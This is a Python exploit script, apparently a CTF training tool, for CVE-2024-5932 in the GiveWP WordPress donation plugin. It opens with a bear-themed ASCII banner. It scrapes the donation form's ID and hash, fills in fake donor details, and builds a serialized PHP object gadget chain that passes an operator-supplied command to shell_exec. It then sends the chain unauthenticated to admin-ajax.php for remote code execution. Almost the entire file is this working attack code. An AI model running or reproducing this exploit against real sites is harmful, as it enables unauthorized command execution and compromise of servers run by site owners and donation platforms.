import hashlib
import random
import re
import sys
import time
from typing import Dict, Optional
from urllib.parse import urlparse

import requests
import rich_click as click
from bs4 import BeautifulSoup
from faker import Faker

# Disable SSL warnings for CTF environment
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

BANNER = r"""
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                      ║
║                    🐻 BEAR-FORCE ONE: CVE-2024-5932 EXPLOIT 🐻                      ║
║                                                                                      ║
║                              ,-.             ,-.                                    ║
║                             /  |           /   |                                    ║
║                            /   |          /    |                                    ║
║                           /    |         /     |                                    ║
║                          /     |        /      |                                    ║
║                         /      |_______/       |                                    ║
║                        /                        \                                   ║
║                       /     🐻  BEAR HACK  🐻     \                                  ║
║                      /    ___________________      \                                 ║
║                     /    /                   \      \                                ║
║                    /    /  ◉           ◉     \      \                               ║
║                   /    /         ___          \      \                              ║
║                  /    /         \   /          \      \                             ║
║                 /    /           \_/            \      \                            ║
║                /    /    "I'm BEARY dangerous!"  \      \                           ║
║               /____/                               \______\                          ║
║                                                                                      ║
║  ═══════════════════════════════════════════════════════════════════════════════════ ║
║                                                                                      ║
║  🎯 TARGET: GiveWP Donation Plugin ≤ 3.14.1                                         ║
║  💥 ATTACK: Unauthenticated PHP Object Injection → RCE                              ║
║  🏆 MISSION: BEAR-ly Legal Penetration Testing                                      ║
║                                                                                      ║
║  🐾 "Some bears hibernate... others PENETRATE!"                                     ║
║  🍯 "This exploit is the BEAR necessities of web security!"                         ║
║  🐻 "Don't poke the bear... unless you're testing for CVEs!"                        ║
║                                                                                      ║
║  ⚠️  WARNING: This bear bites! Use only in authorized environments! ⚠️              ║
║                                                                                      ║
║  🔥 BEAR-FORCE ONE SECURITY TEAM 🔥                                                  ║
║  "Making the web BEAR-able, one exploit at a time!"                                 ║
║                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════╝

    🐻💻 INITIALIZING BEAR-FORCE PENETRATION SYSTEM 💻🐻
    
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    ██  🐾 BEAR FACTS: Bears can run 35mph... this exploit runs even faster! 🐾  ██
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
"""


class GiveWPExploit:
    """CVE-2024-5932 GiveWP PHP Object Injection Exploit for CTF Training"""

    def __init__(self, url: str, target_file: str) -> None:
        """
        Initialize the exploit with target URL and file path.
        
        Args:
            url: Target URL with GiveWP donation form
            target_file: File path to target on the server
        """
        self.url = self._validate_url(url)
        self.target_file = target_file
        self.session = requests.Session()
        self.session.verify = False  # For CTF environment
        self.faker = Faker()

    @staticmethod
    def _validate_url(url: str) -> str:
        """Validate and normalize URL format."""
        if not url.startswith(('http://', 'https://')):
            url = f"https://{url}"
        
        parsed = urlparse(url)
        if not parsed.netloc:
            raise ValueError(f"Invalid URL format: {url}")
        
        return url

    @staticmethod
    def display_banner() -> None:
        """Display the exploit banner."""
        print(BANNER)

    @staticmethod
    def display_loading_spinner(duration: int = 1, interval: float = 0.1) -> None:
        """Display a loading spinner for the specified duration."""
        spinner_chars = ['🐻', '🐾', '🍯', '🐻‍❄️', '🧸', '🐨', '🐼', '🐻']
        end_time = time.time() + duration
        
        while time.time() < end_time:
            for char in spinner_chars:
                sys.stdout.write(f'\r{char} BEAR-FORCE initializing...')
                sys.stdout.flush()
                time.sleep(interval)
        
        print("\r🐻 BEAR-FORCE ready to attack!")

    def _get_base_url(self) -> str:
        """Extract base URL from the target URL."""
        parsed_url = urlparse(self.url)
        return f"{parsed_url.scheme}://{parsed_url.netloc}"

    def _extract_form_parameters(self) -> Dict[str, str]:
        """
        Extract required form parameters from the donation page.
        
        Returns:
            Dictionary containing form parameters
            
        Raises:
            requests.RequestException: If HTTP request fails
            ValueError: If required form elements are not found
        """
        try:
            response = self.session.get(self.url, timeout=10)
            response.raise_for_status()
        except requests.RequestException as e:
            raise requests.RequestException(f"Failed to fetch donation form: {e}")

        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract required form fields
        try:
            give_form_id_input = soup.find('input', {'name': 'give-form-id'})
            give_form_hash_input = soup.find('input', {'name': 'give-form-hash'})
            button_tag = soup.find('button', {'data-price-id': True})

            if not all([give_form_id_input, give_form_hash_input, button_tag]):
                raise ValueError("Required form elements not found")

            give_form_id = give_form_id_input['value']
            give_form_hash = give_form_hash_input['value']
            give_price_id = button_tag['data-price-id']
            give_amount = button_tag.get_text(strip=True)

        except (TypeError, KeyError) as e:
            raise ValueError(f"Error extracting form parameters: {e}")

        # Generate fake user information
        return {
            "give-form-id": give_form_id,
            "give-form-hash": give_form_hash,
            "give-price-id": give_price_id,
            "give-amount": give_amount,
            "give_first": self.faker.first_name(),
            "give_last": self.faker.last_name(),
            "give_email": self.faker.email(),
        }

    def _generate_payload_data(self) -> Dict[str, str]:
        """
        Generate the complete payload data for the exploit.
        
        Returns:
            Dictionary containing all POST parameters including the payload
        """
        # PHP Object Injection payload
        payload_template = (
            'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";'
            'O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:'
            '{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";'
            'O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";'
            's:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:'
            '{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:%d:"%s";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}'
        )
        
        payload = payload_template % (len(self.target_file), self.target_file)
        
        # Get form parameters and add exploit-specific data
        data = self._extract_form_parameters()
        data.update({
            'give_title': payload,
            'give-gateway': 'offline',
            'action': 'give_process_donation'
        })
        
        return data

    def _check_for_embedded_form(self) -> str:
        """
        Check if the form is embedded and return the appropriate URL.
        
        Returns:
            URL to use for the exploit (either original or embedded iframe src)
        """
        try:
            response = self.session.get(self.url, timeout=10)
            response.raise_for_status()
        except requests.RequestException:
            return self.url

        # Look for embedded iframe
        iframe_pattern = r'<iframe[\s\S]*?\bname="give-embed-form"[\s\S]*?>'
        match = re.search(iframe_pattern, response.text)
        
        if match:
            soup = BeautifulSoup(response.text, 'html.parser')
            iframe = soup.find('iframe', {'name': 'give-embed-form'})
            if iframe and iframe.get('src'):
                print("🐾 Embedded form detected - bear is adapting!")
                return iframe['src']
        
        return self.url

    def _send_exploit_request(self) -> None:
        """Send the exploit request to the target server."""
        base_url = self._get_base_url()
        request_url = f"{base_url}/wp-admin/admin-ajax.php"
        
        data = self._generate_payload_data()
        headers = {
            'User-Agent': self.faker.user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        
        # Display sanitized request info
        print(f"🎯 Target: {request_url}")
        print(f"🔢 Form ID: {data['give-form-id']}")
        print(f"🔐 Form Hash: {data['give-form-hash']}")
        print(f"💀 Command: {self.target_file}")
        print(f"📦 Payload Length: {len(data['give_title'])} bytes")
        
        try:
            response = self.session.post(
                request_url, 
                data=data, 
                headers=headers,
                timeout=10
            )
            
            # Handle different response codes
            if response.status_code == 500:
                print(f"🐻 BEAR ATTACK SUCCESSFUL! (HTTP 500 - Server Error)")
                print(f"🍯 Server response indicates payload processing - sweet!")
            elif response.status_code == 200:
                print(f"🐻 Request completed (HTTP 200)")
                print(f"🐾 Check target system for bear tracks (command execution)")
            else:
                print(f"🐨 Unexpected response (HTTP {response.status_code})")
                
        except requests.RequestException as e:
            print(f"🐻‍❄️ Bear attack failed: {e}")
            raise

    def execute_exploit(self) -> None:
        """
        Execute the complete exploit sequence.
        
        Raises:
            requests.RequestException: If HTTP requests fail
            ValueError: If required form elements are not found
        """
        try:
            print("🔍 Bear is scouting the target...")
            self.url = self._check_for_embedded_form()
            
            print("🛠️  Crafting bear-grade exploit payload...")
            print("💥 Unleashing the BEAR-FORCE attack...")
            self._send_exploit_request()
            
            print("🏆 BEAR-FORCE mission accomplished!\n")
            print("🐻 Remember: A good bear always cleans up after itself!")
            
        except Exception as e:
            print(f"🐻‍❄️ Bear got stuck in a honey trap: {e}")
            raise


@click.command()
@click.option(
    "-u",
    "--url",
    required=True,
    help="Target URL with GiveWP donation form",
)
@click.option(
    "-c",
    "--cmd",
    default="/tmp/test",
    help="Target file path on the server",
)
def main(url: str, cmd: str) -> None:
    """🐻 CVE-2024-5932 GiveWP BEAR-FORCE Exploit for CTF Training 🐻"""
    try:
        exploit = GiveWPExploit(url, cmd)
        
        GiveWPExploit.display_banner()
        GiveWPExploit.display_loading_spinner(duration=2)
        
        exploit.execute_exploit()
        
    except (ValueError, requests.RequestException) as e:
        print(f"🐻‍❄️ Bear error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n🐻 Bear was interrupted by user - hibernating now...")
        sys.exit(1)
    except Exception as e:
        print(f"🐨 Unexpected bear behavior: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
